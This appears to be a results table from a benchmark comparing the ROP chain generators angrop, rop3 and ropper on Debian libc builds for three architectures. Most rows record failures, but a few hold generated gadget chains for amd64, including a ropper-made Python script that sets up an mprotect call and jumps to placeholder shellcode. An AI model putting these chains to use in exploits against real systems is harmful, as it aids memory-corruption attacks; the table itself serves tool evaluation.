tool	library	arch	chain	found	seconds	status	chain_text
angrop	libc_debian_aarch64.so	aarch64	mprotect_aarch64	False		unsupported	
rop3	libc_debian_aarch64.so	aarch64	mprotect_aarch64	False	6.3183	not-found	
ropper	libc_debian_aarch64.so	aarch64	mprotect_aarch64	False		unsupported	
angrop	libc_debian_aarch64.so	aarch64	syscall_exec_aarch64	False		unsupported	
rop3	libc_debian_aarch64.so	aarch64	syscall_exec_aarch64	False	7.513	not-found	
ropper	libc_debian_aarch64.so	aarch64	syscall_exec_aarch64	False		unsupported	
angrop	libc_debian_amd64.so	x86_64	mprotect_amd64	False		error	
rop3	libc_debian_amd64.so	x86_64	mprotect_amd64	True	12.1747	found	[libc_debian_amd64.so @ 0x27c65]: pop rdi ; [90mret[0m (x548)\n[libc_debian_amd64.so @ 0x29419]: pop rsi ; [90mret[0m (x183)\n[libc_debian_amd64.so @ 0xfd6cd]: pop rdx ; [90mret[0m (x2)\n[libc_debian_amd64.so @ 0x3f587]: pop rax ; [90mret[0m (x30)\n[libc_debian_amd64.so @ 0x26468]: syscall
ropper	libc_debian_amd64.so	x86_64	mprotect_amd64	True	14.7364	found	[*] Try permuation 1 / 24\n\n\n\n\n#!/usr/bin/env python\n# Generated by ropper ropchain generator #\nfrom struct import pack\n\np = lambda x : pack('Q', x)\n\nshellcode = '\\xcc'*100\n\nIMAGE_BASE_0 = 0x0000000000000000 # 115cd5896c5f9719252094143ff82b0a83ee0eb6d8c295dcb724baf6ea904844\nrebase_0 = lambda x : p(x + IMAGE_BASE_0)\n\n\nrop = ''\nrop += rebase_0(0x0000000000027c65) # 0x0000000000027c65: pop rdi; ret; \nrop += p(0x0000000000001000)\nrop += rebase_0(0x0000000000029419) # 0x0000000000029419: pop rsi; ret; \nrop += p(0x0000000000001000)\nrop += rebase_0(0x00000000000fd6cd) # 0x00000000000fd6cd: pop rdx; ret; \nrop += p(0x0000000000000007)\nrop += rebase_0(0x000000000003f587) # 0x000000000003f587: pop rax; ret; \nrop += p(0x000000000000000a)\nrop += rebase_0(0x00000000000853b2) # 0x00000000000853b2: syscall; ret; \nrop += rebase_0(0x000000000003162a) # 0x000000000003162a: call rsp; \nrop += shellcode\n\nprint(rop)
angrop	libc_debian_amd64.so	x86_64	syscall_exec_amd64	False		error	
rop3	libc_debian_amd64.so	x86_64	syscall_exec_amd64	True	7.9148	found	[libc_debian_amd64.so @ 0x278e9]: pop r12 ; [90mret[0m (x292)\n[libc_debian_amd64.so @ 0x27b6c]: pop rbp ; [90mret[0m (x704)\n[libc_debian_amd64.so @ 0x55937]: mov qword ptr [rbp + 8], r12 ; pop rbx ; pop rbp ; pop r12 ; [90mret[0m (x2) [93m(modifies r12, rbx)[0m\n[libc_debian_amd64.so @ 0x278e9]: pop r12 ; [90mret[0m (x292)\n[libc_debian_amd64.so @ 0x27b6c]: pop rbp ; [90mret[0m (x704)\n[libc_debian_amd64.so @ 0x55937]: mov qword ptr [rbp + 8], r12 ; pop rbx ; pop rbp ; pop r12 ; [90mret[0m (x2) [93m(modifies r12, rbx)[0m\n[libc_debian_amd64.so @ 0x27c65]: pop rdi ; [90mret[0m (x548)\n[libc_debian_amd64.so @ 0x29419]: pop rsi ; [90mret[0m (x183)\n[libc_debian_amd64.so @ 0xfd6cd]: pop rdx ; [90mret[0m (x2)\n[libc_debian_amd64.so @ 0x3f587]: pop rax ; [90mret[0m (x30)\n[libc_debian_amd64.so @ 0x26468]: syscall
ropper	libc_debian_amd64.so	x86_64	syscall_exec_amd64	False	14.0712	not-found	
angrop	libc_debian_amd64.so	x86_64	turing_amd64	False		unsupported	
rop3	libc_debian_amd64.so	x86_64	turing_amd64	False	13.0585	not-found	
ropper	libc_debian_amd64.so	x86_64	turing_amd64	False		unsupported	
angrop	libc_debian_riscv.so	riscv64	mprotect_riscv	False		unsupported	
rop3	libc_debian_riscv.so	riscv64	mprotect_riscv	False	11.5897	not-found	
ropper	libc_debian_riscv.so	riscv64	mprotect_riscv	False		unsupported	
angrop	libc_debian_riscv.so	riscv64	syscall_exec_riscv	False		unsupported	
